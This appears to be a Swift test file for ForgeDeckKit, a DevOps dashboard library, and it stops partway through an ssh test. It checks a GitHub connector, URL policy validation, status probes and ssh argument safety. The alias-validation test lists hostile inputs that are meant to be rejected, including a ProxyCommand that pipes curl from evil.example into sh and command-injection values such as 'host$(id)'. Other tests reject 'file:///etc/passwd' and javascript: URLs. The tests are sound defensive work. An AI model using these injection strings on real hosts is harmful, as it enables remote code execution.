import Foundation
import Testing
@testable import ForgeDeckKit

// Every HTTP exchange here is scripted through MockHTTPClient, and every ssh or docker
// call through a fake runner. Nothing reaches a network or a host.

private let repoPath = "/repos/acme/app"

private func scriptRepository(_ http: MockHTTPClient, head: String = shaA) {
    http.on(repoPath, json: "{\"full_name\": \"acme/app\", \"default_branch\": \"main\"}")
    http.on("\(repoPath)/branches/main", json: """
    {"name": "main", "commit": {"sha": "\(head)", "commit": {"message": "Fix the bug\\n\\nLong body", "committer": {"date": "2026-01-02T03:04:05Z"}}}}
    """)
}

private func scriptFullRepository(_ http: MockHTTPClient) {
    scriptRepository(http)
    http.on("\(repoPath)/pulls", json: """
    [{"number": 42, "title": "Add the thing", "user": {"login": "maya"}, "draft": true,
      "updated_at": "2026-01-02T01:00:00Z", "html_url": "https://github.com/acme/app/pull/42"},
     {"title": "no number, skipped"}]
    """)
    http.on("\(repoPath)/actions/runs", json: """
    {"total_count": 2, "workflow_runs": [
      {"id": 7, "name": "CI", "head_branch": "main", "head_sha": "\(shaA)", "status": "completed", "conclusion": "success",
       "created_at": "2026-01-02T03:10:00Z", "html_url": "https://github.com/acme/app/actions/runs/7"},
      {"id": 8, "name": "CI", "head_branch": "feature", "head_sha": "\(shaB)", "status": "in_progress", "conclusion": null,
       "created_at": "2026-01-02T03:20:00Z"}]}
    """)
    http.on("\(repoPath)/deployments", json: """
    [{"id": 11, "environment": "production", "sha": "\(shaB)", "ref": "main", "created_at": "2026-01-02T02:00:00Z", "creator": {"login": "ci-bot"}},
     {"id": 10, "environment": "production", "sha": "\(shaC)", "ref": "main", "created_at": "2026-01-01T02:00:00Z", "creator": {"login": "ci-bot"}},
     {"id": 9, "environment": "staging", "sha": "\(shaA)", "ref": "main", "created_at": "2026-01-02T02:30:00Z", "creator": {"login": "ci-bot"}}]
    """)
    http.on("\(repoPath)/deployments/11/statuses", json: "[{\"state\": \"success\"}]")
    http.on("\(repoPath)/deployments/9/statuses", json: "[{\"state\": \"failure\"}]")
    // releases/latest is left unscripted: the mock answers 404, which is "no release yet".
}

@Suite struct GitHubConnectorTests {
    @Test func snapshotHappyPath() async throws {
        let http = MockHTTPClient()
        scriptFullRepository(http)
        let result = await GitHubConnector(http: http, token: "test-token").snapshot(owner: "acme", name: "app")
        guard case .success(let snapshot) = result else { Issue.record("expected success, got \(result)"); return }

        #expect(snapshot.defaultBranch == "main")
        #expect(snapshot.headSHA == shaA)
        #expect(snapshot.headMessage == "Fix the bug")
        #expect(snapshot.headDate == ISO8601DateFormatter().date(from: "2026-01-02T03:04:05Z"))
        #expect(snapshot.pullRequests.count == 1)
        #expect(snapshot.pullRequests[0].number == 42)
        #expect(snapshot.pullRequests[0].author == "maya")
        #expect(snapshot.pullRequests[0].isDraft)
        #expect(snapshot.runs.map(\.id) == [7, 8])
        #expect(snapshot.runs[0].succeeded)
        #expect(snapshot.runs[1].conclusion == "")
        #expect(snapshot.defaultBranchRun?.id == 7)
        #expect(snapshot.deployments.map(\.id) == [11, 10, 9])
        // Only the newest record per environment gets its status.
        #expect(snapshot.deployments.map(\.state) == ["success", "", "failure"])
        #expect(snapshot.deployments[0].creator == "ci-bot")
        #expect(snapshot.latestReleaseTag == nil)
        #expect(snapshot.problem == nil)
        #expect(snapshot.provenance.level == .verified)
        #expect(snapshot.provenance.source == .githubAPI)

        let requests = http.requests
        #expect(!requests.contains { $0.url?.path == "\(repoPath)/deployments/10/statuses" })
        #expect(requests.contains { $0.url?.path == "\(repoPath)/releases/latest" })
        #expect(requests.allSatisfy { $0.value(forHTTPHeaderField: "Authorization") == "Bearer test-token" })
        #expect(requests.allSatisfy { $0.url?.host == "api.github.com" && $0.url?.scheme == "https" })
        #expect(requests.allSatisfy { ($0.httpMethod ?? "GET") == "GET" })
        #expect(requests.allSatisfy { !($0.url?.absoluteString ?? "").contains("test-token") })
    }

    @Test func noTokenMeansNoAuthorizationHeader() async {
        let http = MockHTTPClient()
        scriptFullRepository(http)
        _ = await GitHubConnector(http: http).snapshot(owner: "acme", name: "app")
        #expect(http.requests.allSatisfy { $0.value(forHTTPHeaderField: "Authorization") == nil })
    }

    @Test func latestReleaseAndEnvironmentFilter() async {
        let http = MockHTTPClient()
        scriptFullRepository(http)
        http.on("\(repoPath)/releases/latest", json: "{\"tag_name\": \"v1.4.0\"}")
        let result = await GitHubConnector(http: http).snapshot(owner: "acme", name: "app", environments: ["Production"])
        #expect(result.value?.latestReleaseTag == "v1.4.0")
        // Staging is not mapped to an environment, so its status is not requested.
        #expect(result.value?.deployments.map(\.state) == ["success", "", ""])
        #expect(!http.requests.contains { $0.url?.path == "\(repoPath)/deployments/9/statuses" })
    }

    @Test(arguments: [(401, ObservationProblem.unauthorized), (403, .forbidden), (404, .notFound), (500, .unavailable), (503, .unavailable)])
    func statusCodesMapToProblems(status: Int, expected: ObservationProblem) async {
        let http = MockHTTPClient()
        http.on(repoPath, status: status, json: "{\"message\": \"nope\"}")
        let result = await GitHubConnector(http: http, token: "t").snapshot(owner: "acme", name: "app")
        #expect(result.problem == expected)
        #expect(result.value == nil)
        #expect(http.requests.count == 1)
    }

    @Test func rateLimitCarriesRetryAfter() async {
        let http = MockHTTPClient()
        http.on(repoPath, status: 403, json: "{\"message\": \"API rate limit exceeded\"}", headers: ["X-RateLimit-Remaining": "0", "Retry-After": "30"])
        let result = await GitHubConnector(http: http).snapshot(owner: "acme", name: "app")
        guard case .failure(let problem, _, let retry) = result else { Issue.record("expected failure"); return }
        #expect(problem == .rateLimited)
        #expect(retry == 30)
    }

    @Test func rateLimitResetHeaderGivesAWaitTime() async {
        let http = MockHTTPClient()
        let reset = Int(Date.now.timeIntervalSince1970) + 120
        http.on(repoPath, status: 403, json: "{}", headers: ["x-ratelimit-remaining": "0", "x-ratelimit-reset": String(reset)])
        let result = await GitHubConnector(http: http).snapshot(owner: "acme", name: "app")
        guard case .failure(let problem, _, let retry) = result else { Issue.record("expected failure"); return }
        #expect(problem == .rateLimited)
        #expect(retry != nil)
        if let retry { #expect(retry > 60 && retry <= 121) }
    }

    @Test func invalidJSONIsMalformed() async {
        let http = MockHTTPClient()
        http.on(repoPath, json: "<html>Bad gateway</html>")
        #expect(await GitHubConnector(http: http).snapshot(owner: "acme", name: "app").problem == .malformed)

        let wrongShape = MockHTTPClient()
        wrongShape.on(repoPath, json: "[1, 2, 3]")
        #expect(await GitHubConnector(http: wrongShape).snapshot(owner: "acme", name: "app").problem == .malformed)

        let noCommit = MockHTTPClient()
        noCommit.on(repoPath, json: "{\"default_branch\": \"main\"}")
        noCommit.on("\(repoPath)/branches/main", json: "{\"name\": \"main\"}")
        #expect(await GitHubConnector(http: noCommit).snapshot(owner: "acme", name: "app").problem == .malformed)
    }

    @Test(arguments: [(URLError.Code.notConnectedToInternet, ObservationProblem.offline), (.networkConnectionLost, .offline),
                      (.timedOut, .timeout), (.serverCertificateUntrusted, .tlsFailure), (.secureConnectionFailed, .tlsFailure),
                      (.cannotFindHost, .unavailable), (.cancelled, .cancelled)])
    func transportErrorsMapToProblems(code: URLError.Code, expected: ObservationProblem) async {
        let http = MockHTTPClient()
        http.on(repoPath, .error(code))
        #expect(await GitHubConnector(http: http).snapshot(owner: "acme", name: "app").problem == expected)
    }

    @Test func forbiddenRunsGiveAPartialResult() async {
        let partial = MockHTTPClient()
        scriptRepository(partial)
        partial.on("\(repoPath)/pulls", json: "[]")
        partial.on("\(repoPath)/actions/runs", status: 403, json: "{\"message\": \"Resource not accessible\"}")
        partial.on("\(repoPath)/deployments", json: "[]")
        let result = await GitHubConnector(http: partial, token: "t").snapshot(owner: "acme", name: "app")
        guard case .partial(let snapshot, let missing) = result else { Issue.record("expected partial, got \(result)"); return }
        #expect(missing == ["workflow runs (Permission denied)"])
        #expect(snapshot.headSHA == shaA)
        #expect(snapshot.runs.isEmpty)
        #expect(result.problem == nil)
        #expect(result.detail == "Not available: workflow runs (Permission denied)")
    }

    @Test func everyOptionalPartCanBeMissingAtOnce() async {
        let http = MockHTTPClient()
        scriptRepository(http)
        http.on("\(repoPath)/pulls", status: 403, json: "{}")
        http.on("\(repoPath)/actions/runs", status: 403, json: "{}")
        http.on("\(repoPath)/deployments", status: 500, json: "{}")
        http.on("\(repoPath)/releases/latest", status: 500, json: "{}")
        let result = await GitHubConnector(http: http).snapshot(owner: "acme", name: "app")
        guard case .partial(let snapshot, let missing) = result else { Issue.record("expected partial, got \(result)"); return }
        #expect(missing.count == 4)
        #expect(snapshot.headSHA == shaA)
    }

    private func page(_ range: Range<Int>) -> String {
        "[" + range.map { "{\"id\": \($0), \"name\": \"repo-\($0)\", \"owner\": {\"login\": \"acme\"}, \"private\": \($0 % 2 == 0), \"default_branch\": \"trunk\", \"pushed_at\": \"2026-01-02T03:04:05Z\"}" }
            .joined(separator: ",") + "]"
    }

    @Test func repositoriesArePagedUntilAShortPage() async {
        let http = MockHTTPClient()
        http.on("/user/repos?page=1&per_page=100&sort=pushed", json: page(0..<100))
        http.on("/user/repos?page=2&per_page=100&sort=pushed", json: page(100..<200))
        http.on("/user/repos?page=3&per_page=100&sort=pushed", json: page(200..<207))
        let result = await GitHubConnector(http: http, token: "t").repositories()
        guard case .success(let listings) = result else { Issue.record("expected success, got \(result)"); return }
        #expect(listings.count == 207)
        #expect(listings.map(\.id) == Array(0..<207))
        #expect(listings[0].owner == "acme" && listings[0].name == "repo-0")
        #expect(listings[0].isPrivate && !listings[1].isPrivate)
        #expect(listings[0].defaultBranch == "trunk")
        #expect(listings[0].webURL == "https://github.com/acme/repo-0")
        #expect(listings[0].pushedAt != nil)
        #expect(http.requests.count == 3)
    }

    @Test func aFailingLaterPageGivesAPartialListing() async {
        let http = MockHTTPClient()
        http.on("/user/repos?page=1&per_page=100&sort=pushed", json: page(0..<100))
        http.on("/user/repos?page=2&per_page=100&sort=pushed", status: 500, json: "{}")
        let result = await GitHubConnector(http: http).repositories()
        guard case .partial(let listings, let missing) = result else { Issue.record("expected partial, got \(result)"); return }
        #expect(listings.count == 100)
        #expect(missing == ["pages after 1: Unavailable"])
    }

    @Test func aFailingFirstPageIsAFailure() async {
        let http = MockHTTPClient()
        http.on("/user/repos", status: 401, json: "{}")
        #expect(await GitHubConnector(http: http, token: "bad").repositories().problem == .unauthorized)
    }

    @Test func organizationListingAndLimit() async {
        let http = MockHTTPClient()
        http.on("/orgs/acme/repos?page=1&per_page=100&sort=pushed", json: page(0..<100))
        let result = await GitHubConnector(http: http).repositories(organization: "acme", limit: 50)
        #expect(result.value?.count == 50)
        #expect(http.requests.count == 1)
    }

    @Test func etagIsSentAndA304ReusesTheCachedBody() async {
        let http = MockHTTPClient()
        http.on("/user", .response(HTTPResponse(status: 200, headers: ["ETag": "W/\"abc123\"", "X-OAuth-Scopes": "repo, read:org",
                                                                      "X-RateLimit-Remaining": "4999", "X-RateLimit-Limit": "5000"],
                                                body: Data("{\"login\": \"octo\"}".utf8))))
        http.on("/user", .response(HTTPResponse(status: 304)))
        let connector = GitHubConnector(http: http, token: "t")

        let first = await connector.viewer()
        #expect(first.value == GitHubConnector.Viewer(login: "octo", scopes: ["repo", "read:org"], rateLimitRemaining: 4999, rateLimit: 5000))
        let second = await connector.viewer()
        #expect(second.value?.login == "octo")
        #expect(second.problem == nil)

        let requests = http.requests
        #expect(requests.count == 2)
        #expect(requests[0].value(forHTTPHeaderField: "If-None-Match") == nil)
        #expect(requests[1].value(forHTTPHeaderField: "If-None-Match") == "W/\"abc123\"")
    }

    @Test func etagCacheIsBounded() async {
        let cache = ETagCache(capacity: 2)
        await cache.store(etag: "1", body: Data("a".utf8), for: "a")
        await cache.store(etag: "2", body: Data("b".utf8), for: "b")
        await cache.store(etag: "3", body: Data("c".utf8), for: "c")
        #expect(await cache.entry(for: "a") == nil)
        #expect(await cache.entry(for: "b")?.etag == "2")
        #expect(await cache.entry(for: "c")?.body == Data("c".utf8))
    }

    @Test func viewerWithoutALoginIsMalformed() async {
        let http = MockHTTPClient()
        http.on("/user", json: "{\"message\": \"hm\"}")
        #expect(await GitHubConnector(http: http, token: "t").viewer().problem == .malformed)
    }
}

@Suite struct HTTPFailureTests {
    @Test func statusMapping() {
        #expect(HTTPFailure.problem(status: 200, headers: [:]) == nil)
        #expect(HTTPFailure.problem(status: 204, headers: [:]) == nil)
        #expect(HTTPFailure.problem(status: 429, headers: ["retry-after": "12"])?.0 == .rateLimited)
        #expect(HTTPFailure.problem(status: 429, headers: ["retry-after": "12"])?.2 == 12)
        #expect(HTTPFailure.problem(status: 403, headers: ["retry-after": "5"])?.0 == .rateLimited)
        #expect(HTTPFailure.problem(status: 403, headers: ["x-ratelimit-remaining": "17"])?.0 == .forbidden)
        #expect(HTTPFailure.problem(status: 301, headers: [:])?.0 == .unavailable)
    }

    @Test func errorMapping() {
        #expect(HTTPFailure.problem(for: CancellationError()).0 == .cancelled)
        #expect(HTTPFailure.problem(for: URLError(.dataNotAllowed)).0 == .offline)
        #expect(HTTPFailure.problem(for: URLError(.serverCertificateHasBadDate)).0 == .tlsFailure)
        #expect(HTTPFailure.problem(for: ToolFailure(description: "x")).0 == .unavailable)
    }

    @Test func flexibleDates() {
        #expect(FlexibleDate.parse("2026-01-02T03:04:05Z") != nil)
        #expect(FlexibleDate.parse("2026-01-02T03:04:05.123Z") != nil)
        #expect(FlexibleDate.parse("2026-01-02T03:04:05+02:00") == FlexibleDate.parse("2026-01-02T01:04:05Z"))
        #expect(FlexibleDate.parse("yesterday") == nil)
        #expect(FlexibleDate.parse("") == nil)
        #expect(FlexibleDate.parse(nil) == nil)
    }

    @Test func mockClientAnswers404ForUnscriptedPathsAndRepeatsTheLastReply() async throws {
        let http = MockHTTPClient()
        http.on("/a", json: "1")
        http.on("/a", json: "2")
        let request = URLRequest(url: URL(string: "https://x.example/a")!)
        #expect(try await http.send(request).body == Data("1".utf8))
        #expect(try await http.send(request).body == Data("2".utf8))
        #expect(try await http.send(request).body == Data("2".utf8))
        #expect(try await http.send(URLRequest(url: URL(string: "https://x.example/b")!)).status == 404)
        #expect(http.requests.count == 4)
    }
}

@Suite struct URLPolicyTests {
    @Test func httpsIsAcceptedAnywhere() throws {
        #expect(try URLPolicy.validate("https://status.example.com/health").host == "status.example.com")
        #expect(try URLPolicy.validate("  https://example.com:8443/x?y=1  ").port == 8443)
        #expect(try URLPolicy.validate("HTTPS://EXAMPLE.COM/").host?.lowercased() == "example.com")
    }

    @Test func plainHTTPOnAPublicHostIsRejected() {
        for text in ["http://example.com/health", "http://10.0.0.5/health", "http://192.168.1.10:8080/", "http://localhost.example.com/"] {
            #expect(throws: URLPolicy.Violation.insecure, "\(text)") { _ = try URLPolicy.validate(text) }
        }
    }

    @Test func plainHTTPOnLoopbackIsAccepted() throws {
        for text in ["http://localhost:3000/health", "http://127.0.0.1:8000/", "http://LOCALHOST/", "http://app.localhost:5173/", "http://[::1]:3000/"] {
            #expect(throws: Never.self, "\(text)") { _ = try URLPolicy.validate(text) }
        }
        #expect(URLPolicy.isLoopback("localhost") && URLPolicy.isLoopback("127.0.0.1") && URLPolicy.isLoopback("::1"))
        #expect(!URLPolicy.isLoopback("example.com") && !URLPolicy.isLoopback("localhost.example.com"))
    }

    @Test func embeddedCredentialsAreRejected() {
        for text in ["https://user:pass@example.com/", "https://token@example.com/", "http://admin:admin@localhost:3000/"] {
            #expect(throws: URLPolicy.Violation.embeddedCredentials, "\(text)") { _ = try URLPolicy.validate(text) }
        }
    }

    @Test func otherSchemesAreRejected() {
        for text in ["ftp://example.com/file", "file://localhost/etc/passwd", "ssh://example.com/x", "ws://example.com/socket", "javascript://example.com/%0aalert(1)"] {
            #expect(throws: URLPolicy.Violation.scheme, "\(text)") { _ = try URLPolicy.validate(text) }
        }
    }

    @Test func thingsThatAreNotURLsAreInvalid() {
        for text in ["", "   ", "example.com/health", "/just/a/path", "https://", "file:///etc/passwd"] {
            #expect(throws: URLPolicy.Violation.invalid, "\(text)") { _ = try URLPolicy.validate(text) }
        }
    }

    /// BUG (ConnectorCore.swift, URLPolicy.isLoopback): `hasPrefix("127.")` treats any host name that merely
    /// starts with "127." as loopback, so "http://127.evil.example/" is accepted as plain HTTP and a bearer
    /// token would travel unencrypted to a public host. Fix: accept "127." only for a dotted-quad IPv4 literal.
    @Test func aHostNameThatStartsWith127IsNotLoopback() {
        #expect(!URLPolicy.isLoopback("127.evil.example"))
        #expect(throws: URLPolicy.Violation.insecure) { _ = try URLPolicy.validate("http://127.0.0.1.evil.example/status") }
    }
}

@Suite struct HTTPProbeTests {
    private let statusPath = "/_forgedeck/v1/status"

    private func companionProbe(expectedProductID: String? = nil) -> ProbeConfig {
        var probe = ProbeConfig()
        probe.name = "Status"
        probe.kind = .companion
        probe.url = "https://app.acme.example/_forgedeck/v1/status"
        probe.expectedProductID = expectedProductID
        return probe
    }

    private func status(_ json: String, tier: EnvironmentTier = .production, probe: ProbeConfig? = nil, bearer: String? = nil) async -> (ProbeOutcome, MockHTTPClient) {
        let http = MockHTTPClient()
        http.on(statusPath, json: json)
        let outcome = await HTTPProbeConnector(http: http, ttl: 600).status(probe ?? companionProbe(), bearer: bearer, expectedTier: tier)
        return (outcome, http)
    }

    @Test func healthCheckOK() async {
        let http = MockHTTPClient()
        http.on("/health", json: "ok")
        var probe = ProbeConfig()
        probe.url = "https://app.acme.example/health"
        let outcome = await HTTPProbeConnector(http: http).status(probe, bearer: nil, expectedTier: .production)
        #expect(outcome.sample.ok)
        #expect(outcome.sample.statusCode == 200)
        #expect(outcome.sample.problem == nil)
        #expect(outcome.sample.latencyMS != nil)
        // A plain health check proves the endpoint answers. It says nothing about the release.
        #expect(outcome.deployment == nil)
        #expect(http.requests.first?.value(forHTTPHeaderField: "Authorization") == nil)
    }

    @Test func healthCheckFailures() async {
        var probe = ProbeConfig()
        probe.url = "https://app.acme.example/health"
        for (status, problem) in [(503, ObservationProblem.unavailable), (401, .unauthorized), (404, .notFound)] {
            let http = MockHTTPClient()
            http.on("/health", status: status, json: "")
            let outcome = await HTTPProbeConnector(http: http).status(probe, bearer: nil, expectedTier: .production)
            #expect(!outcome.sample.ok)
            #expect(outcome.sample.statusCode == status)
            #expect(outcome.sample.problem == problem)
        }
        // A 200 when another status is expected is a failure too.
        probe.expectedStatus = 204
        let http = MockHTTPClient()
        http.on("/health", json: "")
        let outcome = await HTTPProbeConnector(http: http).status(probe, bearer: nil, expectedTier: .production)
        #expect(!outcome.sample.ok)
        #expect(outcome.sample.problem == .unavailable)
    }

    @Test func companionStatusBecomesAVerifiedObservation() async throws {
        let (outcome, http) = await status("""
        {"schema_version": "1.2", "product_id": "acme", "environment": "production", "observed_at": "2026-01-02T03:04:05Z",
         "release": {"commit_sha": "\(shaA.uppercased())", "version": "v2.14.0", "deployed_at": "2026-01-02T01:00:00Z"},
         "health": {"state": "degraded", "checks": [{"id": "db", "state": "healthy"}, {"id": "queue", "state": "degraded"}]},
         "instances": [{"id": "a", "commit_sha": "\(shaA)"}, {"id": "b", "commit_sha": "\(shaA)"}]}
        """, bearer: "probe-token")
        let observation = try #require(outcome.deployment)
        #expect(observation.sha == shaA)
        #expect(observation.version == "v2.14.0")
        #expect(observation.deployedAt == ISO8601DateFormatter().date(from: "2026-01-02T01:00:00Z"))
        #expect(observation.health == .degraded)
        #expect(observation.problem == nil)
        #expect(!observation.isMixed)
        #expect(observation.provenance.level == .verified)
        #expect(observation.provenance.source == .runtimeProbe)
        #expect(abs(observation.provenance.expiresAt.timeIntervalSince(observation.provenance.observedAt) - 600) < 0.001)
        #expect(outcome.sample.ok)
        #expect(outcome.sample.statusCode == 200)
        #expect(outcome.detail == "Degraded: queue")
        #expect(http.requests.first?.value(forHTTPHeaderField: "Authorization") == "Bearer probe-token")
    }

    @Test func anUnhealthyTargetIsStillAVerifiedRelease() async throws {
        let (outcome, _) = await status("{\"schema_version\": \"1.0\", \"release\": {\"commit_sha\": \"\(shaA)\"}, \"health\": {\"state\": \"unhealthy\"}}")
        #expect(!outcome.sample.ok)
        #expect(outcome.sample.problem == .unavailable)
        let observation = try #require(outcome.deployment)
        #expect(observation.health == .unhealthy)
        #expect(observation.provenance.level == .verified)
        #expect(observation.sha == shaA)
    }

    @Test func aStagingBuildAnsweringOnTheProductionURLIsRejected() async throws {
        let (outcome, _) = await status("{\"schema_version\": \"1.0\", \"environment\": \"staging\", \"release\": {\"commit_sha\": \"\(shaA)\"}, \"health\": {\"state\": \"healthy\"}}")
        #expect(!outcome.sample.ok)
        #expect(outcome.sample.problem == .malformed)
        let observation = try #require(outcome.deployment)
        #expect(observation.problem == .malformed)
        #expect(observation.sha == nil && observation.version == nil)
        #expect(observation.provenance.level == .unknown)
        #expect(observation.detail.contains("staging") && observation.detail.contains("production"))
    }

    @Test func aLocalBuildMayCallItselfLocalOrDev() async {
        for declared in ["local", "dev", "development", "LOCAL"] {
            let (outcome, _) = await status("{\"schema_version\": \"1.0\", \"environment\": \"\(declared)\", \"release\": {\"version\": \"dev\"}, \"health\": {\"state\": \"healthy\"}}", tier: .development)
            #expect(outcome.deployment?.problem == nil, "\(declared)")
            #expect(outcome.deployment?.provenance.level == .verified, "\(declared)")
        }
        let (wrong, _) = await status("{\"schema_version\": \"1.0\", \"environment\": \"local\", \"release\": {\"version\": \"dev\"}}", tier: .staging)
        #expect(wrong.deployment?.problem == .malformed)
    }

    @Test func anotherProductAnsweringIsRejected() async {
        let json = "{\"schema_version\": \"1.0\", \"product_id\": \"someone-else\", \"release\": {\"commit_sha\": \"\(shaA)\"}, \"health\": {\"state\": \"healthy\"}}"
        let (mismatch, _) = await status(json, probe: companionProbe(expectedProductID: "acme"))
        #expect(mismatch.deployment?.problem == .malformed)
        #expect(mismatch.deployment?.sha == nil)
        #expect(mismatch.sample.problem == .malformed)
        let (match, _) = await status(json, probe: companionProbe(expectedProductID: "someone-else"))
        #expect(match.deployment?.sha == shaA)
        let (unchecked, _) = await status(json)
        #expect(unchecked.deployment?.sha == shaA)
    }

    @Test func anUnsupportedSchemaMajorIsRejected() async {
        let (outcome, _) = await status("{\"schema_version\": \"2.0\", \"release\": {\"commit_sha\": \"\(shaA)\"}, \"health\": {\"state\": \"healthy\"}}")
        #expect(outcome.sample.problem == .unsupported)
        #expect(outcome.deployment?.problem == .unsupported)
        #expect(outcome.deployment?.sha == nil)
        #expect(outcome.deployment?.provenance.level == .unknown)
        let (minor, _) = await status("{\"schema_version\": \"1.9\", \"release\": {\"commit_sha\": \"\(shaA)\"}}")
        #expect(minor.deployment?.provenance.level == .verified)
    }

    @Test func aBadTimestampIsToleratedAndStillVerified() async throws {
        let (outcome, _) = await status("{\"schema_version\": \"1.0\", \"release\": {\"commit_sha\": \"\(shaA)\", \"deployed_at\": \"last tuesday\"}, \"health\": {\"state\": \"healthy\"}}")
        let observation = try #require(outcome.deployment)
        #expect(observation.deployedAt == nil)
        #expect(observation.sha == shaA)
        #expect(observation.provenance.level == .verified)
        #expect(observation.problem == nil)
        #expect(outcome.sample.ok)
    }

    @Test func aMissingReleaseIsNotVerified() async throws {
        for json in ["{\"schema_version\": \"1.0\", \"health\": {\"state\": \"healthy\"}}",
                     "{\"schema_version\": \"1.0\", \"release\": {}, \"health\": {\"state\": \"healthy\"}}",
                     "{\"schema_version\": \"1.0\", \"release\": {\"commit_sha\": \"main\"}, \"health\": {\"state\": \"healthy\"}}"] {
            let (outcome, _) = await status(json)
            let observation = try #require(outcome.deployment)
            #expect(observation.provenance.level == .unknown)
            #expect(observation.problem == .malformed)
            #expect(observation.sha == nil)
            // The endpoint answered, so the health sample is still good.
            #expect(outcome.sample.ok)
        }
    }

    @Test func aVersionWithoutACommitIsVerified() async {
        let (outcome, _) = await status("{\"schema_version\": \"1.0\", \"release\": {\"version\": \"2026.01.02\"}, \"health\": {\"state\": \"healthy\"}}")
        #expect(outcome.deployment?.version == "2026.01.02")
        #expect(outcome.deployment?.sha == nil)
        #expect(outcome.deployment?.provenance.level == .verified)
    }

    @Test func instancesOnDifferentRevisionsAreAMixedRollout() async throws {
        let (outcome, _) = await status("""
        {"schema_version": "1.0", "release": {"commit_sha": "\(shaA)"}, "health": {"state": "healthy"},
         "instances": [{"id": "a", "commit_sha": "\(shaA)"}, {"id": "b", "commit_sha": "\(shaB)"}, {"id": "c", "commit_sha": "not-a-sha"}]}
        """)
        let observation = try #require(outcome.deployment)
        #expect(observation.instanceSHAs == [shaA, shaB])
        #expect(observation.isMixed)
        #expect(observation.detail.contains("2 different revisions"))
    }

    @Test func unauthorizedWithAToken() async throws {
        let http = MockHTTPClient()
        http.on(statusPath, status: 401, json: "{\"error\": \"invalid token\"}")
        let outcome = await HTTPProbeConnector(http: http).status(companionProbe(), bearer: "revoked-token", expectedTier: .production)
        #expect(!outcome.sample.ok)
        #expect(outcome.sample.problem == .unauthorized)
        #expect(outcome.sample.statusCode == 401)
        let observation = try #require(outcome.deployment)
        #expect(observation.problem == .unauthorized)
        #expect(observation.provenance.level == .unknown)
        #expect(http.requests.first?.value(forHTTPHeaderField: "Authorization") == "Bearer revoked-token")
        #expect(!outcome.detail.contains("revoked-token"))
    }

    @Test func aBodyThatIsNotTheContractIsMalformed() async {
        for json in ["<html>login</html>", "{}", "{\"schema_version\": 1}", "[]"] {
            let (outcome, _) = await status(json)
            #expect(outcome.sample.problem == .malformed, "\(json)")
            #expect(outcome.deployment?.problem == .malformed, "\(json)")
        }
    }

    @Test(arguments: [(URLError.Code.notConnectedToInternet, ObservationProblem.offline), (.timedOut, .timeout), (.serverCertificateUntrusted, .tlsFailure)])
    func transportErrors(code: URLError.Code, expected: ObservationProblem) async {
        let http = MockHTTPClient()
        http.on(statusPath, .error(code))
        let outcome = await HTTPProbeConnector(http: http).status(companionProbe(), bearer: nil, expectedTier: .production)
        #expect(outcome.sample.problem == expected)
        #expect(outcome.sample.statusCode == nil)
        #expect(outcome.deployment?.problem == expected)
        #expect(!outcome.sample.ok)
    }

    @Test func aURLThatBreaksThePolicyIsNeverRequested() async {
        let http = MockHTTPClient()
        var probe = companionProbe()
        for url in ["http://app.acme.example/status", "https://user:pw@app.acme.example/status", "ftp://app.acme.example/status", ""] {
            probe.url = url
            let outcome = await HTTPProbeConnector(http: http).status(probe, bearer: "token", expectedTier: .production)
            #expect(outcome.sample.problem == .notConfigured, "\(url)")
            #expect(!outcome.sample.ok)
        }
        #expect(http.requests.isEmpty)
    }
}

@Suite struct SSHTests {
    private let changedKey = """
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
    Host key verification failed.
    """

    @Test func argumentsAlwaysCheckHostKeysAndNeverPrompt() {
        for command in SSHProbeCommand.catalog + [SSHProbeCommand.release(path: "/srv/app/RELEASE")!] {
            let arguments = SSHInspector.arguments(alias: "prod-1", command: command)
            #expect(arguments.contains("StrictHostKeyChecking=yes"))
            #expect(arguments.contains("BatchMode=yes"))
            #expect(!arguments.contains { $0.lowercased().contains("stricthostkeychecking=no") })
            #expect(!arguments.contains { $0.lowercased().contains("accept-new") })
            #expect(!arguments.contains { $0.lowercased().contains("userknownhostsfile") })
            #expect(arguments.contains("ForwardAgent=no"))
            // Options end before the alias, and the remote command is the single last argument.
            #expect(Array(arguments.suffix(3)) == ["--", "prod-1", command.remote])
        }
    }

    @Test func aliasValidation() {
        for alias in ["prod-1", "web01.example.com", "deploy@host", "my_host", "10.0.0.5"] {
            #expect(SSHConfig.isValidAlias(alias), "\(alias)")
        }
        for alias in ["-oProxyCommand=curl evil.example|sh", "-oProxyCommand=x", "-p", "host name", "host;id", "host$(id)", "host`id`",
                      "host|cat", "host\nother", "", "hôst", "host/../x", String(repeating: "a", count: 256)] {
            #expect(!SSHConfig.isValidAlias(alias), "\(alias)")
        }
    }

    @Test func stderrClassification() {
        #expect(SSHInspector.classify(stderr: changedKey).0 == .hostKeyChanged)
        #expect(SSHInspector.classify(stderr: "Host key verification failed.\n").0 == .hostKeyUnknown)
        #expect(SSHInspector.classify(stderr: "No ED25519 host key is known for web01 and you have requested strict checking.\nHost key verification failed.").0 == .hostKeyUnknown)
        #expect(SSHInspector.classify(stderr: "deploy@web01: Permission denied (publickey).").0 == .unauthorized)
        #expect(SSHInspector.classify(stderr: "ssh: Could not resolve hostname web01: nodename nor servname provided").0 == .unavailable)
        #expect(SSHInspector.classify(stderr: "ssh: connect to host web01 port 22: Operation timed out").0 == .timeout)
        #expect(SSHInspector.classify(stderr: "ssh: connect to host web01 port 22: Connection refused").0 == .unavailable)
        #expect(SSHInspector.classify(stderr: "bash: line 1: docker: command not found").0 == .unsupported)
        #expect(SSHInspector.classify(stderr: "").0 == .unavailable)
    }

    @Test func aChangedHostKeyIsNeverOKAndNeverVerified() async {
        let runner = FakeRunner(result: ProcessResult(exitCode: 255, stderr: changedKey))
        let inspector = SSHInspector(runner: runner)
        let result = await inspector.probe(alias: "prod-1", command: SSHProbeCommand.find("uptime")!)
        #expect(!result.ok)
        #expect(result.problem == .hostKeyChanged)
        #expect(result.detail.contains("Nothing was sent"))

        let observation = await inspector.release(alias: "prod-1", path: "/srv/app/RELEASE")
        #expect(observation.problem == .hostKeyChanged)
        #expect(observation.sha == nil && observation.version == nil)
        #expect(observation.provenance.level == .unknown)
        #expect(observation.provenance.effectiveLevel() == .unknown)

        // ssh was asked with strict checking both times, and never told to accept the new key.
        #expect(runner.requests.count == 2)
        for request in runner.requests {
            #expect(request.executable.path == "/usr/bin/ssh")
